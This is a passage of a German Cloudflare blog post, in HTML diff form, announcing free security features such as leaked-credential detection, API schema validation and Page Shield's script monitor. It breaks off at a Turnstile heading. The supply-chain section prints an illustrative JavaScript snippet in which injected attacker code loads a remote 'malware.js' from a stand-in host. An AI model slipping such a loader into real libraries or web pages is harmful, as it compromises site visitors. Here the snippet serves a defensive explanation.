@@ -1,0 +1,226 @@
+<div class="mb2 gray5">Lesezeit: 10&nbsp;Min.</div>
+<div class="mt4">Dieser Beitrag ist auch auf <a href="https://blog.cloudflare.com/a-safer-internet-with-cloudflare">English</a>, <a href="https://blog.cloudflare.com/zh-tw/a-safer-internet-with-cloudflare">繁體中文</a>, <a href="https://blog.cloudflare.com/fr-fr/a-safer-internet-with-cloudflare">Français</a>, <a href="https://blog.cloudflare.com/ja-jp/a-safer-internet-with-cloudflare">日本語</a>, <a href="https://blog.cloudflare.com/ko-kr/a-safer-internet-with-cloudflare">한국어</a>, <a href="https://blog.cloudflare.com/es-es/a-safer-internet-with-cloudflare">Español</a>, und <a href="https://blog.cloudflare.com/zh-cn/a-safer-internet-with-cloudflare">简体中文</a> verfügbar.</div><img class="mr2" src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/63TGtoovZb40m6p78i5d4R/60fa00809d7b909277c56721dfa453ca/image4.png" alt="">
+<div class="post-content post-body-content lh-copy gray1">
+	<p>Wer das Internet nutzt, kommt vermutlich täglich mit dem Cloudflare-Netzwerk in Berührung – sei es durch den Zugriff auf eine durch Cloudflare geschützte Website, die Nutzung unseres <a href="https://1.1.1.1/dns" target="_blank" rel="noopener noreferrer"><u>1.1.1.1-Resolvers</u></a> oder die Verbindung über ein Netzwerk mittels unserer Cloudflare One-Produkte.</p>
+	<p>Cloudflare obliegt damit die große Verantwortung, das Internet für Milliarden von Nutzern weltweit sicherer zu machen. Ab sofort stellen wir allen unseren Kunden Bedrohungsdaten und mehr als zehn neue Sicherheitsfunktionen kostenlos zur Verfügung. Egal, ob Sie Cloudflare verwenden, um Ihre Website, Ihr Heimnetzwerk oder Ihr Büro zu schützen: Wir haben auf jeden Fall etwas Hilfreiches für Sie, das Sie mit wenigen Klicks nutzen können.</p>
+	<p>Diese Funktionen konzentrieren sich auf einige der größten und sich verstärkenden Probleme im Bereich Cybersicherheit, darunter <a href="https://www.cloudflare.com/zero-trust/solutions/account-takeover-prevention" target="_blank" rel="noopener noreferrer"><u>Angriffe zur Kontoübernahme</u></a>, <a href="https://blog.cloudflare.com/tag/supply-chain-attacks"><u>Supply Chain-Attacken</u></a>, <a href="https://www.cloudflare.com/learning/security/api/what-is-api-security" target="_blank" rel="noopener noreferrer"><u>Angriffe auf API-Endpunkte</u></a>, <a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring" target="_blank" rel="noopener noreferrer"><u>Netzwerküberblick</u></a> und <a href="https://www.cloudflare.com/learning/access-management/what-is-dlp" target="_blank" rel="noopener noreferrer"><u>Netzwerk-Datenlecks</u></a>.</p>
+	<div class="flex anchor relative">
+		<h2 id="more-security-for-everyone">Mehr Sicherheit für alle</h2>
+		<a href="https://blog.cloudflare.com/#more-security-for-everyone" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Im folgenden Text erfahren Sie mehr über jede dieser Funktionen. Vorab möchten wir aber eine kurze Zusammenfassung liefern.</p>
+	<p><b>Wenn Sie sich für Cybersicherheit interessieren: </b>Auf unserer <a href="http://cloudflare.com/threat-intelligence" target="_blank" rel="noopener noreferrer"><u>neuen Cloudforce One-Website für Bedrohungsdaten</u></a> können Sie sich über Angreifer, Angriffskampagnen und andere das Internet betreffende IT-Sicherheitsprobleme informieren.</p>
+	<p><b>Wenn Sie Betreiber einer Website sind</b>: Ab heute umfassen alle unsere Free-Tarife den Zugang zu <a href="https://developers.cloudflare.com/waf/analytics/security-analytics" target="_blank" rel="noopener noreferrer"><u>Sicherheitsanalysen</u></a> für die zugehörigen Zonen. Darüber hinaus machen wir <a href="https://developers.cloudflare.com/dns/additional-options/analytics" target="_blank" rel="noopener noreferrer"><u>DNS-Analysedaten</u></a> über GraphQL für jedermann verfügbar.</p>
+	<p>Sobald Sie sich einen Überblick verschafft haben, geht es darum, gut- von bösartigem Datenverkehr zu unterscheiden. Alle Kunden erhalten Zugang zu einer dauerhaft <a href="https://developers.cloudflare.com/waf/managed-rules/check-for-exposed-credentials" target="_blank" rel="noopener noreferrer"><u>aktiven Erkennung von Angriffen zur Kontoübernahme</u></a>, einer <a href="https://developers.cloudflare.com/api-shield/security/schema-validation" target="_blank" rel="noopener noreferrer"><u>API-Schema-Validierung</u></a> zur Durchsetzung eines positiven Sicherheitsmodells bei ihren API-Endpunkten und einem <a href="https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts" target="_blank" rel="noopener noreferrer"><u>Page Shield-Script-Monitor</u></a>. Dieser bietet Einblick in die Assets von Drittanbietern, die Sie von Ihrer Seite aus laden und die für Supply-Chain-Angriffe eingesetzt werden könnten.</p>
+	<p><b>Wenn Sie Cloudflare zum Schutz Ihrer Mitarbeitenden und Ihres Netzwerks verwenden</b>: Wir werden eine Reihe unserer Cloudflare One-Produkte in einem neuen kostenlosen Angebotspaket bündeln. Dieses enthält die aktuellen, von uns <a href="https://www.cloudflare.com/plans/zero-trust-services" target="_blank" rel="noopener noreferrer"><u>kostenlos angebotenen Zero Trust-Produkte</u></a> und neue Lösungen wie <a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring" target="_blank" rel="noopener noreferrer"><u>Magic Network Monitoring</u></a> für Netzwerküberblick, <a href="https://www.cloudflare.com/learning/access-management/what-is-dlp" target="_blank" rel="noopener noreferrer"><u>Schutz vor Datenverlust (Data Loss Prevention – DLP)</u></a> für sensible Informationen und <a href="https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring" target="_blank" rel="noopener noreferrer"><u>Digital Experience Monitoring</u></a> zur Messung von Netzwerkkonnektivität und -Performance. Cloudflare ist der einzige Anbieter, der kostenlose Versionen solcher Lösungen anbietet.</p>
+	<p><b>Wenn Sie ein neuer Nutzer sind: </b>Wir bieten neue Optionen zur Authentifizierung. Ab heute besteht bei uns die Möglichkeit, Google zur Authentifizierung für die Registrierung und das Einloggen bei Cloudflare zu verwenden. Dadurch wird es für einige unserer Kunden einfacher, sich anzumelden und die Abhängigkeit von Passwörtern zu verringern, die man sich merken muss. Dadurch verringert sich wiederum die Wahrscheinlichkeit, dass ihr Cloudflare-Konto kompromittiert wird.</p>
+	<p>Jetzt schauen wir uns das Ganze genauer an:</p>
+	<div class="flex anchor relative">
+		<h2 id="threat-intelligence-analytics">Bedrohungs- und Analysedaten</h2>
+		<a href="https://blog.cloudflare.com/#threat-intelligence-analytics" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+
+	<div class="flex anchor relative">
+		<h3 id="cloudforce-one">Cloudforce One</h3>
+		<a href="https://blog.cloudflare.com/#cloudforce-one" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p><a href="https://blog.cloudflare.com/introducing-cloudforce-one-threat-operations-and-threat-research"><u>Cloudforce One</u></a>, unser Team für Bedrohungsforschung und Betrieb,&nbsp; freut sich, die Einführung einer <a href="http://cloudflare.com/threat-intelligence" target="_blank" rel="noopener noreferrer"><u>frei zugänglichen Website speziell für Bedrohungsdaten</u></a> bekannt geben zu können. Wir werden diese zur Veröffentlichung sowohl technischer Informationen als auch speziell für Führungskräfte relevanter Erkenntnisse bezüglich der neuesten Aktivitäten und Taktiken von Angreifern sowie von Einblicken in neue Schadsoftware, Sicherheitslücken und Angriffe nutzen.</p>
+	<p>Wir führen außerdem zwei neue Kennzahlen im Bereich Bedrohungsdaten ein und versprechen, dass weitere folgen werden. Schauen Sie einfach auf der <a href="http://cloudflare.com/threat-intelligence" target="_blank" rel="noopener noreferrer"><u>neuen Website</u></a> vorbei, um sich die aktuellen Untersuchungen anzusehen. Diese befassen sich mit einem hartnäckigen Angreifer auf staatlicher Linie, der Unternehmen in Süd- und Ostasien ins Visier nimmt, sowie mit der Zunahme des sogenannten „Double Brokering“ zwecks Frachtbetrug.&nbsp;</p>
+	<p><a href="http://cloudflare.com/threat-intelligence" target="_blank" rel="noopener noreferrer"><u>Melden Sie sich jetzt an</u></a>, um künftig E-Mail-Benachrichtigungen zu neuen Bedrohungsuntersuchungen zu erhalten.</p>
+	<div class="flex anchor relative">
+		<h3 id="security-analytics">Sicherheitsanalysen</h3>
+		<a href="https://blog.cloudflare.com/#security-analytics" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Sicherheitsanalysen bieten Ihnen einen Blick auf Ihren <b>gesamten</b> HTTP-Traffic – nicht nur auf abgewehrte Anfragen. So können Sie sich auf das Wesentliche konzentrieren: Datenverkehr, der als bösartig eingestuft, aber möglicherweise nicht abgewehrt wurde. Sie können dafür nicht nur „Security Events“ verwenden, um sich die von unseren Produkten für Anwendungssicherheit ergriffenen Sicherheitsmaßnahmen anzeigen zu lassen, sondern auch „Security Analytics“, um Ihren gesamten Datenverkehr auf Anomalien oder seltsames Verhalten zu überprüfen und dann anhand der gewonnenen Erkenntnisse präzise Abwehrregeln auf Grundlage Ihrer spezifischen Traffic-Muster zu erstellen. Ab sofort steht diese Möglichkeit allen unseren Kunden offen, welchen Tarif auch immer sie nutzen.&nbsp;</p>
+	<p>Nutzer mit Free- und Pro-Tarif haben jetzt Zugang zu <a href="https://dash.cloudflare.com/?to=%2F%3Aaccount%2F%3Azone%2Fsecurity%2Fanalytics" target="_blank" rel="noopener noreferrer"><u>einem neuen Dashboard</u></a> für Sicherheitsanalysen. Dort können sie sich einen Überblick über ihren Datenverkehr im Traffic-Analyse-Diagramm verschaffen. Es besteht dort auch die Möglichkeit des Gruppierens und Filterns, um Anomalien mühelos zu erkennen. Sie können auch Top-Statistiken abrufen und nach einer Vielzahl von Merkmalen filtern – darunter Länder, Quellbrowser, Quellbetriebssysteme, HTTP-Versionen, SSL-Protokollversionen, Cache-Status und Sicherheitsmaßnahmen.&nbsp;</p>
+	<figure class="kg-card kg-image-card">
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7oBM7D78NDErNNgIPRSJN9/055440bfd256bb2f128d5d99858a5748/image6.jpg" alt="" class="kg-image" width="1617" height="667" loading="lazy">
+	</figure>
+	<div class="flex anchor relative">
+		<h3 id="dns-analytics">DNS-Analysen</h3>
+		<a href="https://blog.cloudflare.com/#dns-analytics" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Jeder Nutzer bei Cloudflare hat jetzt Zugang zu <a href="https://dash.cloudflare.com/?to=%2F%3Aaccount%2F%3Azone%2Fdns%2Fanalytics" target="_blank" rel="noopener noreferrer"><u>dem neuen und verbesserten DNS-Analyse-Dashboard</u></a> sowie zu dem neuen DNS-Analysedatensatz über unsere <a href="https://developers.cloudflare.com/analytics/graphql-api" target="_blank" rel="noopener noreferrer"><u>leistungsstarke GraphQL-API</u></a>. Sie können die DNS-Abfragen an Ihre Domain(s) jetzt ganz einfach analysieren, indem Sie leistungsstarke Filter anwenden und DNS-Abfragen nach Quelle aufschlüsseln. Das kann für die Fehlersuche, das Erkennen von Mustern und Trends oder die Erstellung von Nutzungsberichten hilfreich sein.</p>
+	<p>Mit der <a href="https://blog.cloudflare.com/foundation-dns-launch"><u>Veröffentlichung von Foundation DNS</u></a> haben wir neue DNS-Analysen auf Basis von GraphQL eingeführt. Diese Analysen waren jedoch bisher nur für Zonen mit <a href="https://developers.cloudflare.com/dns/foundation-dns/advanced-nameservers" target="_blank" rel="noopener noreferrer"><u>erweiterten Nameservern</u></a> verfügbar. Da diese Analysedaten jedoch tiefgehende Einblicke ermöglichen, waren wir der Meinung, dass wir diese Funktion der Allgemeinheit zugänglich machen sollten. Ab sofort können die neuen DNS-Analysedaten auf GraphQL-Basis in jeder Zone über den autoritativen DNS-Dienst von Cloudflare unter „Analytics“ im Abschnitt „DNS“ abgerufen werden.</p>
+	<figure class="kg-card kg-image-card">
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3LJ4aIFB4pHhHtWeWzYlgV/96c701d7c826a92e1220c7cd85f40f88/image5.png" alt="" class="kg-image" width="1482" height="928" loading="lazy">
+	</figure>
+	<div class="flex anchor relative">
+		<h2 id="application-threat-detection-and-mitigation">Erkennung und Abwehr von Anwendungsbedrohungen</h2>
+		<a href="https://blog.cloudflare.com/#application-threat-detection-and-mitigation" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+
+	<div class="flex anchor relative">
+		<h3 id="account-takeover-detection">Erkennung von Kontoübernahmen</h3>
+		<a href="https://blog.cloudflare.com/#account-takeover-detection" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p><a href="https://techreport.com/statistics/cybersecurity/password-reuse-statistics" target="_blank" rel="noopener noreferrer"><u>65 % der Internetnutzer</u></a> sind aufgrund der Wiederverwendung von Passwörtern und der zunehmenden Häufigkeit großer Datenlecks anfällig für Kontoübernahmen. Um ein besseres Internet zu schaffen, muss der Schutz wichtiger Konten für jedermann unkompliziert und leicht zugänglich sein.</p>
+	<p>Ab heute bieten wir jedem – von einzelnen Nutzern bis hin zu großen Unternehmen – kostenlos robusten Kontoschutz. Dieser hilft dabei, Credential Stuffing und andere auf Kontoübernahmen abzielende Angriffe zu durchkreuzen. Darüber hinaus stellen wir erweiterte Funktionen wie Prüfungen auf geleakte Anmeldedaten und Erkennung von Angriffen zur Kontoübernahme kostenlos zur Verfügung.&nbsp;</p>
+	<p>Diese Updates umfassen die automatische Erkennung von Anmeldungen, die Verhinderung von Brute-Force-Angriffen mit minimalem Setup und den Zugriff auf eine umfassende Datenbank mit geleakten Anmeldedaten und über 15 Milliarden Passwörtern, die neben unserer eigenen Datenbank auch geleakte Passwörter aus dem <a href="https://haveibeenpwned.com" target="_blank" rel="noopener noreferrer"><u>HIBP (Have I been Pwned)</u></a>-Dienst enthalten wird. Kunden können gegen Anfragen mittels geleakter Anmeldedaten Maßnahmen ergreifen, und zwar entweder über Funktionen der Cloudflare-WAF wie <a href="https://developers.cloudflare.com/waf/rate-limiting-rules" target="_blank" rel="noopener noreferrer"><u>Regeln zur Durchsatzbegrenzung</u></a> und <a href="https://developers.cloudflare.com/waf/custom-rules" target="_blank" rel="noopener noreferrer"><u>benutzerdefinierte Regeln</u></a> oder beim Ursprungsserver durch die Durchsetzung einer <a href="https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication" target="_blank" rel="noopener noreferrer"><u>Multi-Faktor-Authentifizierung (MFA)</u></a> oder die verpflichtende Zurücksetzung von Passwörtern auf Grundlage eines an den Ursprungsserver gesendeten Headers.</p>
+	<p>Die Einrichtung ist einfach: Nutzer des Free-Tarifs kommen in den Genuss einer automatischen Erkennung, während zahlende Kunden die neuen Funktionen mit einem einzigen Klick im Cloudflare-Dashboard aktivieren können. Weitere Informationen zum Setup und zur Konfiguration finden Sie in unserer <a href="https://developers.cloudflare.com/waf/detections/leaked-credentials" target="_blank" rel="noopener noreferrer"><u>Dokumentation</u></a>, die Sie jetzt nutzen können!</p>
+	<div class="flex anchor relative">
+		<h3 id="api-schema-validation">API-Schema-Validierung</h3>
+		<a href="https://blog.cloudflare.com/#api-schema-validation" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>API-Traffic <a href="https://www.cloudflare.com/2024-api-security-management-report" target="_blank" rel="noopener noreferrer"><u>macht mehr als die Hälfte</u></a> des dynamischen Datenverkehrs im Cloudflare-Netzwerk aus. Durch die große Beliebtheit von API ist eine ganze <a href="https://cyware.com/news/unprotected-database-belonging-to-justdial-exposes-personal-information-of-almost-100-million-users-1d5bb7a9" target="_blank" rel="noopener noreferrer"><u>Reihe</u></a> neuer <a href="https://venturebeat.com/security/t-mobile-data-breach-shows-api-security-cant-be-ignored" target="_blank" rel="noopener noreferrer"><u>Angriffs</u></a><a href="https://venturebeat.com/security/twitter-breach-api-attack" target="_blank" rel="noopener noreferrer"><u>vektoren</u></a> entstanden. Die <a href="https://developers.cloudflare.com/api-shield/security/schema-validation" target="_blank" rel="noopener noreferrer"><u>Schema-Validierung</u></a> von Cloudflare API Shield stellt den ersten Schritt zur <a href="https://blog.cloudflare.com/api-gateway"><u>Stärkung</u></a> Ihrer API-Sicherheit angesichts dieser neuen Bedrohungen dar.&nbsp;</p>
+	<p>Jetzt kann erstmals <i>jeder</i> Cloudflare-Kunde die Schema-Validierung einsetzen, um sicherzustellen, dass nur gültige Anfragen an seine API seinen Ursprungsserver erreichen.</p>
+	<p>Diese Funktion unterbindet die versehentliche Offenlegung von Informationen aufgrund von Fehlern. Sie verhindert außerdem, dass Entwickler Endpunkte durch einen nicht standardisierten Prozess willkürlich preisgeben, und blockiert automatisch Zombie-API, da Ihr API-Bestand im Rahmen einer kontinuierlichen Integration und Implementierung (Continuous Integration and Continuous Deployment – CI/CD) auf dem neuesten Stand gehalten wird.</p>
+	<figure class="kg-card kg-image-card">
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3PMaRYLTwff6D7sdXRysJ7/728deb51cbec996c6741c428639b6900/image2.png" alt="" class="kg-image" width="1557" height="1351" loading="lazy">
+	</figure>
+	<p>Wir empfehlen Ihnen, die <a href="https://developers.cloudflare.com/api/operations/api-shield-schema-validation-post-schema" target="_blank" rel="noopener noreferrer"><u>API</u></a> oder den Terraform-<a href="https://developers.cloudflare.com/api-shield/reference/terraform" target="_blank" rel="noopener noreferrer"><u>Provider</u></a> von Cloudflare zu verwenden, um Endpunkte zu Cloudflare API Shield hinzuzufügen und das Schema nach der Freigabe Ihres Quellcodes im Rahmen Ihres Post-Build-CI/CD-Prozesses zu aktualisieren. Auf diese Weise wird API Shield zu einem bevorzugten API-Inventarisierungstool und die <a href="https://developers.cloudflare.com/api-shield/security/schema-validation" target="_blank" rel="noopener noreferrer"><u>Schema-Validierung</u></a> übernimmt unerwartete Anfragen an Ihre API.</p>
+	<p>Während sich bei API alles um die Integration mit Drittanbietern dreht, werden manchmal Integrationen durch das Laden von Bibliotheken direkt in Ihre Anwendung durchgeführt. Als Nächstes werden wir dazu beitragen, das Web noch sicherer zu machen, indem wir Nutzer vor schädlichen Dritt-Skripten schützen, die sensible Informationen aus Eingaben auf Ihren Seiten entwenden.</p>
+	<div class="flex anchor relative">
+		<h3 id="supply-chain-attack-prevention">Vorbeugung von Suppy-Chain-Angriffen</h3>
+		<a href="https://blog.cloudflare.com/#supply-chain-attack-prevention" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Moderne Webanwendungen verbessern die Nutzererfahrung und verkürzen die Entwicklungszeit durch die Verwendung von JavaScript-Bibliotheken von Drittanbietern. Aufgrund ihrer privilegierten Zugriffsebene für alles auf der Seite kann eine kompromittierte JavaScript-Bibliothek eines Drittanbieters heimlich – vom Endnutzer oder Website-Administrator unbemerkt – sensible Daten an einen Angreifer übermitteln.</p>
+	<p>Um dieser Bedrohung entgegenzuwirken, haben wir vor <a href="https://blog.cloudflare.com/introducing-page-shield"><u>drei Jahren</u></a> Page Shield eingeführt. Ab sofort stellen wir allen unseren Nutzern den Script Monitor von Page Shield kostenlos zur Verfügung.</p>
+	<figure class="kg-card kg-image-card">
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5b6sxHcCLgIAHfb6Qub6NR/ae2f22ed1d2126804a5bc6e333d64fed/image3.png" alt="" class="kg-image" width="1999" height="1843" loading="lazy">
+	</figure>
+	<p>Mit <a href="https://dash.cloudflare.com/?to=%2F%3Aaccount%2F%3Azone%2Fsecurity%2Fpage-shield" target="_blank" rel="noopener noreferrer"><u>Script Monitor</u></a> sehen Sie <i>alle</i> auf der Seite geladenen JavaScript-Assets, nicht nur die von Ihren Entwicklern einbezogenen. Diese Übersicht umfasst auch Skripte, die dynamisch von anderen Skripten geladen werden. Sobald ein Angreifer die Bibliothek kompromittiert hat, ist es für ihn ein Kinderspiel, ein neues schädliches Skript hinzuzufügen, ohne den Kontext des ursprünglichen HTML-Quellcodes zu verändern. Es genügt, neuen Quellcode in das bestehende enthaltene JavaScript-Asset einzufügen:</p>
+	<pre class="language-JavaScript"><code class="language-JavaScript">// Original library code (trusted)
+function someLibraryFunction() {
+    // useful functionality here
+}
+
+// Malicious code added by the attacker
+let malScript = document.createElement('script');
+malScript.src = 'https://example.com/malware.js';
+document.body.appendChild(malScript);</code></pre>
+	<p>Script Monitor war unverzichtbar, als bekannt wurde, dass <a href="https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk"><u>die Bibliothek http://pollyfill.io den Besitzer gewechselt hat</u></a>. Die Nutzer von Script Monitor konnten sofort sehen, welche Skripte auf ihren Websites geladen wurden. So war für sie schnell und leicht erkennbar, ob eine Gefährdung bestand.</p>
+	<p>Wir freuen uns, dass wir den Überblick über diese Skripte nun auf so viel wie möglich im Web ausdehnen können, indem wir Script Monitor für alle Kunden freigeben. Wie Sie loslegen können, erfahren Sie <a href="https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts" target="_blank" rel="noopener noreferrer"><u>hier in der Dokumentation</u></a>.</p>
+	<p>Bestehende Nutzer von Page Shield können sofort die überwachten Daten filtern, denn sie wissen, ob polyfill.io (oder eine andere Bibliothek) von ihrer Anwendung verwendet wird. Außerdem haben wir als Reaktion auf den kompromittierten Dienst <a href="https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet"><u>eine Neufassung von polyfill.io erstellt</u></a>, die im Juni 2024 automatisch für Free-Tarife aktiviert wurde.</p>
+	<div class="flex anchor relative">
+		<h3 id="turnstile-as-a-google-firebase-extension">Turnstile als Google Firebase-Erweiterung hinzugefügt&nbsp;</h3>
+		<a href="https://blog.cloudflare.com/#turnstile-as-a-google-firebase-extension" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
